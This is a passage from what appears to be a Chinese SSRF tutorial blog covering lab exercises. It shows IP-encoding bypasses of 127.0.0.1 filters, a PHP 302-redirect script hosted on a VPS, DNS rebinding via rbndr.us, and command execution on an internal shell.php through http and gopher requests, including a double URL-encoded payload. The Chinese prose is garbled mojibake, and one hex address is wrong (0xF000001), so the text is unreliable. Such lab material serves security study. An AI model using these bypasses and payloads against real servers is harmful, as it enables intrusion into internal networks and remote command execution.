class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423013853782.png" alt="image-20250423013853782"></p><h2 id="SSRFç»•è¿‡"><a href="#SSRFç»•è¿‡" class="headerlink" title="SSRFç»•è¿‡"></a>SSRFç»•è¿‡</h2><h3 id="SSRFä¹‹å›ç¯åœ°å€ç»•è¿‡"><a href="#SSRFä¹‹å›ç¯åœ°å€ç»•è¿‡" class="headerlink" title="SSRFä¹‹å›ç¯åœ°å€ç»•è¿‡"></a>SSRFä¹‹å›ç¯åœ°å€ç»•è¿‡</h3><p>å¦‚ä¸‹é¡µé¢è¦æ±‚è®¿é—®æœ¬åœ°çš„<code>flag.php</code>æ–‡ä»¶ï¼Œä½†ä¼šå‘ç°<code>127.0.0.1</code>è¢«è¿‡æ»¤äº†</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/flag.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423131511681.png" alt="image-20250423131511681"></p><h4 id="å…¶ä»–è¿›åˆ¶ç»•è¿‡"><a href="#å…¶ä»–è¿›åˆ¶ç»•è¿‡" class="headerlink" title="å…¶ä»–è¿›åˆ¶ç»•è¿‡"></a>å…¶ä»–è¿›åˆ¶ç»•è¿‡</h4><p>å½“<code>127.0.0.1</code>è¢«é™åˆ¶æ—¶ï¼Œå¯ä»¥å°†å…¶è¿›è¡Œå˜å½¢æ˜¾ç¤ºï¼Œä½¿ç”¨å…¶ä»–è¿›åˆ¶è¿›è¡Œç»•è¿‡</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>ç‚¹åˆ†åè¿›åˆ¶<br><span class="hljs-number">01111111000000000000000000000001</span>æ•°æ®åŒ…ä¸­å®é™…æ˜¯<span class="hljs-number">32</span>ä½bitäºŒè¿›åˆ¶ï¼Œæ²¡æœ‰ç‚¹<br><span class="hljs-number">0b01111111000000000000000000000001</span>äºŒè¿›åˆ¶<br><span class="hljs-number">017700000001</span>å…«è¿›åˆ¶<br><span class="hljs-number">0x7F000001</span>åå…­è¿›åˆ¶<br><span class="hljs-number">2130706433</span>åè¿›åˆ¶ï¼ˆè¿ç»­ï¼‰<br></code></pre></td></tr></table></figure><p>å®é™…åº”ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># ç‚¹åˆ†åè¿›åˆ¶</span><br>http:<span class="hljs-comment">//127.0.0.1/flag.php</span><br><span class="hljs-comment"># äºŒè¿›åˆ¶</span><br>http:<span class="hljs-comment">//0b01111111000000000000000000000001/flag.php</span><br><span class="hljs-comment"># å…«è¿›åˆ¶</span><br>http:<span class="hljs-comment">//017700000001/flag.php</span><br><span class="hljs-comment"># ç‚¹åˆ†å…«è¿›åˆ¶</span><br>http:<span class="hljs-comment">//0177.0000.0000.0001/flag.php</span><br><span class="hljs-comment"># åå…­è¿›åˆ¶</span><br>http:<span class="hljs-comment">//0xF000001/flag.php</span><br><span class="hljs-comment"># ç‚¹åˆ†åå…­è¿›åˆ¶</span><br>http:<span class="hljs-comment">//0x7F.0x00.0x00.0x01/flag.php</span><br>http:<span class="hljs-comment">//0x7F.0.0.1/flag.php</span><br><span class="hljs-comment"># ä¸‰åäºŒè¿›åˆ¶</span><br>http:<span class="hljs-comment">//01111111000000000000000000000001/flag.php</span><br><span class="hljs-comment"># åè¿›åˆ¶</span><br>http:<span class="hljs-comment">//2130706433/flag.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423132338626.png" alt="image-20250423132338626"></p><h3 id="SSRFä¹‹302é‡å®šå‘ç»•è¿‡"><a href="#SSRFä¹‹302é‡å®šå‘ç»•è¿‡" class="headerlink" title="SSRFä¹‹302é‡å®šå‘ç»•è¿‡"></a>SSRFä¹‹302é‡å®šå‘ç»•è¿‡</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>æ”»å‡»è€…è®¿é—®SSRFæœåŠ¡å™¨ï¼ˆå¦‚<code>http://home.ctf.com:7777</code>ï¼‰ï¼ŒSSRFæœåŠ¡å™¨è§£æè®¿é—®å…¬ç½‘webæœåŠ¡å™¨ï¼ˆæœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨ï¼Œå¯ä»¥å¯¹åŸŸåè§£æçš„webæœåŠ¡å™¨ï¼‰ï¼Œç„¶åè¿™å°æœåŠ¡å™¨è¿”å›é‡å®šå‘302åˆ°127.0.0.1ç»™SSRFæœåŠ¡å™¨ï¼Œè¿™å¯ä»¥ç»•è¿‡æˆ‘ä»¬æƒ³è¦æäº¤çš„å—é™åˆ¶çš„åœ°å€ï¼Œç„¶åSSRFæœåŠ¡å™¨è®¿é—®æœ¬åœ°127.0.0.1ï¼Œå¹¶ä¸”æŠŠç»“æœè¿”å›ç»™æ”»å‡»è€…</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423132638267.png" alt="image-20250423132638267"></p><h4 id="æ„å»º302é‡å®šå‘ä»£ç "><a href="#æ„å»º302é‡å®šå‘ä»£ç " class="headerlink" title="æ„å»º302é‡å®šå‘ä»£ç "></a>æ„å»º302é‡å®šå‘ä»£ç </h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: http://127.0.0.1/flag.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨æœ‰å…¬ç½‘IPçš„VPSä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å†™å…¥ä¸Šé¢çš„ä»£ç </p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423135138756.png" alt="image-20250423135138756"></p><p>ç„¶åä½¿ç”¨å‘½ä»¤ç›‘å¬7777ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0.0.0.0:7777<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423135214639.png" alt="image-20250423135214639"></p><p>åœ¨é¶åœºéšä¾¿è®¿é—®ä¸€ä¸ªå†…ç½‘åœ°å€</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.1.151:7777/index.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423134019306.png" alt="image-20250423134019306"></p><p>è¿™é‡Œæ— æ³•å›æ˜¾ï¼Œå› ä¸ºç¦ç”¨äº†è®¿é—®å†…ç½‘IP</p><p>å¯ä»¥é€šè¿‡è®¿é—®åˆšæ‰çš„VPSçš„ä»£ç æ–‡ä»¶ï¼Œä»è€Œè¿”å›é‡å®šå‘302åˆ°127.0.0.1ç»™SSRFæœåŠ¡å™¨ï¼Œç„¶åSSRFæœåŠ¡å™¨è®¿é—®æœ¬åœ°127.0.0.1ï¼Œå¹¶ä¸”æŠŠç»“æœè¿”å›ç»™æˆ‘ä»¬</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//&lt;VPSçš„IP&gt;/302.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423135501357.png" alt="image-20250423135501357"></p><h3 id="SSRFä¹‹DNSé‡ç»‘å®šç»•è¿‡"><a href="#SSRFä¹‹DNSé‡ç»‘å®šç»•è¿‡" class="headerlink" title="SSRFä¹‹DNSé‡ç»‘å®šç»•è¿‡"></a>SSRFä¹‹DNSé‡ç»‘å®šç»•è¿‡</h3><p>é’ˆå¯¹SSRFæ¼æ´çš„é˜²å¾¡</p><ul><li>è§£æç›®æ ‡URLï¼Œè·å–å…¶Host</li><li>è§£æHostï¼Œè·å–HostæŒ‡å‘çš„IPåœ°å€</li><li>æ£€æŸ¥IPåœ°å€æ˜¯å¦ä¸ºå†…ç½‘åœ°å€</li><li>è¯·æ±‚URL</li><li>å¦‚æœæœ‰è·³è½¬ï¼Œæ‹¿å‡ºè·³è½¬URLï¼Œæ‰§è¡Œ1</li></ul><p>å¯ä»¥æœ‰æ•ˆé™åˆ¶ä»¥ä¸‹å†…å®¹</p><ul><li>ç›´æ¥è®¿é—®å†…ç½‘IP</li><li>302è·³è½¬</li><li>xip.io&#x2F;xip.nameåŠçŸ­é“¾æ¥å˜æ¢ç­‰URLå˜å½¢</li><li>ç•¸å½¢URL</li><li><code>iframe</code>æ”»å‡»</li><li>IPè¿›åˆ¶è½¬æ¢</li></ul><p>ä½†æ˜¯æ— æ³•é˜²å¾¡DNSé‡ç»‘å®šæ”»å‡»</p><h4 id="SSRFé˜²å¾¡æ¨¡å¼"><a href="#SSRFé˜²å¾¡æ¨¡å¼" class="headerlink" title="SSRFé˜²å¾¡æ¨¡å¼"></a>SSRFé˜²å¾¡æ¨¡å¼</h4><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/1737183472115-1fe2ee10-c532-44bb-b5d8-ac7569a5c703.webp" alt="image.png"></p><ul><li>åœ¨ç”¨æˆ·æµè§ˆå™¨è¾“å…¥URLï¼Œå®¢æˆ·ç«¯è·å–è¾“å…¥çš„URLï¼Œä»è¯¥URLé‡Œæå–Hostï¼ˆIPåœ°å€ï¼Œå¯èƒ½æ˜¯IPåœ°å€ï¼Œä¹Ÿå¯èƒ½æ˜¯åŸŸåï¼‰</li><li>å¦‚æœæå–åˆ°çš„Hostæ˜¯åŸŸåï¼Œå¯¹è¯¥Hostè¿›è¡ŒDNSè§£æï¼Œä»è€Œè·å–åˆ°è§£æçš„IPåœ°å€</li><li>åˆ¤æ–­è·å–åˆ°çš„IPåœ°å€æ˜¯åˆæ³•çš„è¿˜æ˜¯éæ³•çš„ï¼ˆå¦‚æ˜¯å¦æ˜¯ç§æœ‰IPç­‰ï¼‰ï¼Œå¦‚æœæ˜¯éæ³•çš„ï¼Œç›´æ¥è¿”å›å†…å®¹</li><li>å¦‚æœæ£€æµ‹åˆ°IPåœ°å€æ˜¯åˆæ³•çš„ï¼Œå°±ä¼šæ‰§è¡ŒæœåŠ¡ç«¯è¯·æ±‚URLï¼ˆcurlçš„é˜¶æ®µå‘åŒ…ï¼‰ï¼Œè¿™é‡Œå†è¿›è¡Œä¸€æ¬¡DNSè§£æ</li></ul><p>ä¸¤æ¬¡DNSè§£æ</p><ul><li>**ç¬¬ä¸€æ¬¡DNSè§£æï¼š**æ˜¯å¯¹URLçš„Hostè¿›è¡ŒDNSè§£æ</li><li>**ç¬¬äºŒæ¬¡DNSè§£æï¼š**ä½¿ç”¨curlå‘åŒ…æ—¶å€™è¿›è¡ŒDNSè§£æ</li></ul><p>æ¼æ´æ˜¯åœ¨ç¬¬äºŒæ¬¡DNSè§£ææ—¶å½¢æˆçš„ï¼Œå¯ä»¥åˆ©ç”¨ä¸¤æ¬¡DNSè§£æçš„æ—¶é—´å·®è¿›è¡Œç»•è¿‡</p><h4 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h4><p>åˆ©ç”¨æœåŠ¡å™¨ä¸¤æ¬¡è§£æåŒä¸€åŸŸåçš„çŸ­æš‚é—´éš™ï¼Œæ›´æ¢åŸŸåèƒŒåçš„IPï¼Œè¾¾åˆ°çªç ´åŒæºç­–ç•¥æˆ–è¿‡WAFè¿›è¡ŒSSRFçš„ç›®çš„</p><p><strong>ç¬¬ä¸€æ¬¡DNSè§£ææ—¶æ£€æµ‹URLçš„ï¼Œç¬¬äºŒæ¬¡DNSè§£ææ˜¯çœŸæ­£å»è®¿é—®ï¼Œåœ¨ç¬¬ä¸€æ¬¡ä½¿å…¶è·å–çš„æ˜¯ä¸€ä¸ªå‡çš„IPåœ°å€ï¼Œåœ¨ç¬¬äºŒæ¬¡æ—¶è·å–åˆ°ä¸€ä¸ªå›ç¯åœ°å€ï¼Œè¿™å°±å¯ä»¥ç»•è¿‡WAFçš„é™åˆ¶ï¼Œè¿›è¡ŒSSRF</strong></p><p>ç¼“å­˜æ˜¯ä¸DNSä¸­çš„æœºåˆ¶TTLæœ‰å…³ï¼šåŸŸåå’ŒIPç»‘å®šå…³ç³»çš„Cacheå­˜æ´»çš„æœ€é•¿æ—¶é—´</p><p>TTLæœ€ç†æƒ³çš„è®¾ç½®æ˜¯0ï¼Œå³åœ¨ç¬¬ä¸€æ¬¡è§£æåï¼Œç«‹é©¬æ¢ä½æˆ‘ä»¬æƒ³è¦è®¿é—®çš„å†…ç½‘IPï¼Œæœ‰äº›å…¬å…±DNSæœåŠ¡å™¨è¿˜æ˜¯ä¼šæŠŠè®°å½•è¿›è¡Œç¼“å­˜</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423141417741.png" alt="image-20250423141417741"></p><p>å¯ä»¥ä½¿TTLå€¼ä¸º0çš„ç½‘ç«™ï¼š<a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p>ä¸‹é¢ä¿©çš„ç§ç½‘å’Œå…¬ç½‘IPå¯ä»¥è°ƒæ¢</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423142122121.png" alt="image-20250423142122121"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://deb74166.7f000001.rbndr.us/flag.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423142207456.png" alt="image-20250423142207456"></p><h2 id="SSRFè¿›è¡Œå…¶ä»–æ¼æ´åˆ©ç”¨"><a href="#SSRFè¿›è¡Œå…¶ä»–æ¼æ´åˆ©ç”¨" class="headerlink" title="SSRFè¿›è¡Œå…¶ä»–æ¼æ´åˆ©ç”¨"></a>SSRFè¿›è¡Œå…¶ä»–æ¼æ´åˆ©ç”¨</h2><h3 id="ä½¿ç”¨SSRFè¿›è¡Œå‘½ä»¤æ‰§è¡Œ"><a href="#ä½¿ç”¨SSRFè¿›è¡Œå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ä½¿ç”¨SSRFè¿›è¡Œå‘½ä»¤æ‰§è¡Œ"></a>ä½¿ç”¨SSRFè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</h3><p>å‰ææ˜¯å·²ç»é€šè¿‡å‰é¢å­¦ä¹ çš„ä¸‰ä¸ªä¼ªåè®®æˆåŠŸæŸ¥æ‰¾åˆ°å†…ç½‘å­˜æ´»çš„ä¸»æœºã€å¼€æ”¾çš„ç«¯å£ã€å¹¶ä¸”é€šè¿‡ç›®å½•æ‰«æå‡ºä¸€ä¸ªå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´çš„é¡µé¢ï¼Œå¦‚ä¸‹è·å–çš„<code>shell.php</code>å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/shell.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423143421393.png" alt="image-20250423143421393"></p><h4 id="ä½¿ç”¨httpä¼ªåè®®è¿›è¡ŒGETæäº¤"><a href="#ä½¿ç”¨httpä¼ªåè®®è¿›è¡ŒGETæäº¤" class="headerlink" title="ä½¿ç”¨httpä¼ªåè®®è¿›è¡ŒGETæäº¤"></a>ä½¿ç”¨<code>http</code>ä¼ªåè®®è¿›è¡ŒGETæäº¤</h4><p>è¿™ä¸ªé¡µé¢å¯ä»¥é€šè¿‡æäº¤GETå‚æ•°<code>cmd</code>è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.4/shell.php?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423143712002.png" alt="image-20250423143712002"></p><h4 id="ä½¿ç”¨gopherä¼ªåè®®è¿›è¡ŒGETæäº¤"><a href="#ä½¿ç”¨gopherä¼ªåè®®è¿›è¡ŒGETæäº¤" class="headerlink" title="ä½¿ç”¨gopherä¼ªåè®®è¿›è¡ŒGETæäº¤"></a>ä½¿ç”¨<code>gopher</code>ä¼ªåè®®è¿›è¡ŒGETæäº¤</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/shell.php?cmd=ls</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.4<br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆè¿›è¡ŒæŠ“åŒ…</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.4:80/_</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423144503637.png" alt="image-20250423144503637"></p><p>æ”¾å…¥é‡æ”¾å™¨è¿›è¡Œä¸¤æ¬¡URLç¼–ç </p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423144744986.png" alt="image-20250423144744986"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423144822738.png" alt="image-20250423144822738"></p><p>å‘é€è¯·æ±‚</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423144920889.png" alt="image-20250423144920889"></p><h4 id="ä½¿ç”¨gopherä¼ªåè®®è¿›è¡ŒPOSTæäº¤"><a href="#ä½¿ç”¨gopherä¼ªåè®®è¿›è¡ŒPOSTæäº¤" class="headerlink" title="ä½¿ç”¨gopherä¼ªåè®®è¿›è¡ŒPOSTæäº¤"></a>ä½¿ç”¨<code>gopher</code>ä¼ªåè®®è¿›è¡ŒPOSTæäº¤</h4><p>ä½¿ç”¨<code>http</code>ä¼ªåè®®è®¿é—®æ¼æ´ç½‘ç«™</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.5/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423145354279.png" alt="image-20250423145354279"></p><p>å¯ä»¥ä½¿ç”¨bpæŠ“åŒ…è·å–å‚æ•°</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423145650718.png" alt="image-20250423145650718"></p><p>è¿›è€Œæ„é€ POC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.5<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>12<br><br><span class="language-abnf"><span 